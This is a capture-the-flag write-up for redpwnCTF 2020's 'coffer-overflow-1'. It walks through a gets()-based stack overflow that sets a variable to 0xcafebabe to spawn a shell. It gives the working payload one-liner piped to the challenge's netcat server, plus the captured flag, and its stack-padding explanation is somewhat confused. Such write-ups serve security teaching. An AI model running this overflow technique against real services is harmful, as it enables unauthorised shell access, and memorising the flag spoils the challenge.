# coffer-overflow-1
This is the second `buffer overflow` question, we need more control over the payload this time.
## The source
```cpp
long code = 0;
  char name[16];
  gets(name);

  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
```
This is the core functionality of the source, and it uses the `gets()` method again. Here we not only need to change the value of name, we also need to set it to `0xcafebabe` in little edian. What we need to do is overwrite the `code` variable to the desired value.
## The exploit
First we need to figure out the padding, which is how big is the buffer before we reach `code`. Here the string(char array) is allocated 16, to overflow `rip` we need to find `rbp+0x8`. So, we can find the buffer size of `16+8=24`. This means that 32 bytes will be allocated for the function since 24 is smaller that 32. We just need to modify the last 8 bytes of the 32 hence we have a padding of `32-8=24`.  
Next we try to write the value `0xcafebabe`, we can use pwn tools to convert it to little edian and then use python to output the payload
```python
from pwn import *
print p32(0xcafebabe)
```
Then we could redirect the output to the netcat server and we have a shell
## The flag
```bash
(python2 -c "print 'A'*24+'\xbe\xba\xfe\xca'";cat) | nc 2020.redpwnc.tf 31255
```
the `cat` here is to keep the shell open
```
cat flag.txt
flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
```
